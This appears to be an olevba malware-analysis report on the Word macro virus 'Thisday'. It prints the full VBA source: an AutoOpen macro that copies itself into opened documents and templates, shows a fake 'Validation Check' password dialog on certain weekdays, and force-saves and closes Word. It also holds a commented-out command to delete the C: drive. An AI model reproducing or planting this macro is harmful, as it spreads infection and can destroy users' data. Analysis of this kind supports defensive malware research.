olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thisday-fc4835bbd9850521e9c4daacf724ebb930d1ddc5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thisday-fc4835bbd9850521e9c4daacf724ebb930d1ddc5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoopen.bas 
in file: Virus.MSWord.Thisday-fc4835bbd9850521e9c4daacf724ebb930d1ddc5 - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim thisday
Dim DayFlag
Dim Button
Dim Flag$
Dim False_
ReDim NameList__$(3)
WordBasic.DisableInput
NameList__$(0) = "µçÄÔ²¿"
NameList__$(1) = "IBM"
NameList__$(2) = "MicroSoft"
NameList__$(3) = "Compaq"
thisday = WordBasic.WeekDay(WordBasic.Now()) - 1
'MsgBox Str$(thisday)
    If WordBasic.CountWindows() = 0 Then
         WordBasic.FileNew
         WordBasic.SetDocumentVar "NewFlag", "True"
    Else
         WordBasic.SetDocumentVar "NewFlag", "False"
    End If
    WordBasic.SetDocumentVar "CloseFlag", "True"
WordBasic.BeginDialog 320, 144, "Validation Check", "AutoOpen.MyFunc"
    WordBasic.OKButton 170, 108, 88, 21
    WordBasic.DropListBox 106, 33, 160, 38, NameList__$(), "DropListBox1"
    WordBasic.Text 20, 33, 68, 13, "UserName£º", "Text1"
'   Text 19, 62, 48, 13, "UserId£º", .Text2
'   TextBox 106, 60, 160, 18, .TextBox1
    WordBasic.Text 119, 8, 78, 13, "Certification", "Text3"
    WordBasic.Picture 3, 88, 118, 54, "fig", 1, "Picture1"
WordBasic.EndDialog

Dim LoginDlg As Object: Set LoginDlg = WordBasic.CurValues.UserDialog
DayFlag = WordBasic.Today() > WordBasic.DateSerial(97, 7, 20)
If ((thisday = 3) Or (thisday = 5)) And DayFlag Then Button = WordBasic.Dialog.UserDialog(LoginDlg)
Flag$ = WordBasic.[GetDocumentVar$]("CloseFlag")
If (DayFlag = False_) Then Flag$ = "False"
'MsgBox Flag$ + " "
If WordBasic.[FileNameFromWindow$]() <> "" Then
On Error GoTo -1: On Error GoTo Infest
WordBasic.MacroCopy WordBasic.[FileNameFromWindow$]() + ":AutoOpen", "AutoOpen"
Infest: On Error GoTo -1: On Error GoTo NInfest
WordBasic.MacroCopy "AutoOpen", WordBasic.[FileNameFromWindow$]() + ":AutoOpen"
NInfest:
    If (thisday <> 3) And (thisday <> 5) Then
    WordBasic.FileSaveAll 1, 1
    Flag$ = "False"
    End If
End If
If Flag$ = "True" Then ExitWord
End Sub


Private Function MyFunc(identifier$, action, suppvalue)
    Select Case action
Case 1     'The Dialog Displayed
Case 2     ' the user Selects a Control
    If identifier$ = "DropListBox1" Then
    Dim Password$
    Password$ = "0"
    On Error Resume Next
    Password$ = WordBasic.[InputBox$]("Input your Password")
       If (WordBasic.DlgValue("DropListBox1") = 0) Then
    WordBasic.SetDocumentVar "CloseFlag", "True"
       ElseIf (WordBasic.DlgValue("DropListBox1") = 1) And (WordBasic.Val(Password$) <> 20300) Then
    WordBasic.SetDocumentVar "CloseFlag", "True"
       ElseIf (WordBasic.DlgValue("DropListBox1") = 2) And (WordBasic.Val(Password$) <> 36000) Then
    WordBasic.SetDocumentVar "CloseFlag", "True"
       ElseIf (WordBasic.DlgValue("DropListBox1") = 3) And (WordBasic.Val(Password$) <> 40004) Then
    WordBasic.SetDocumentVar "CloseFlag", "True"
Else
    WordBasic.SetDocumentVar "CloseFlag", "False"
End If
End If
Case 3      ' Text Changed
    'MsgBox LoginDlg.TextBox2
Case Else
End Select
End Function

Private Sub ExitWord()
'Shell Environ$("COMSPEC") + "/c Deltree /Y C:\"
WordBasic.SetTemplateDirty
WordBasic.FileSaveAll 1, 1
WordBasic.AppClose
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

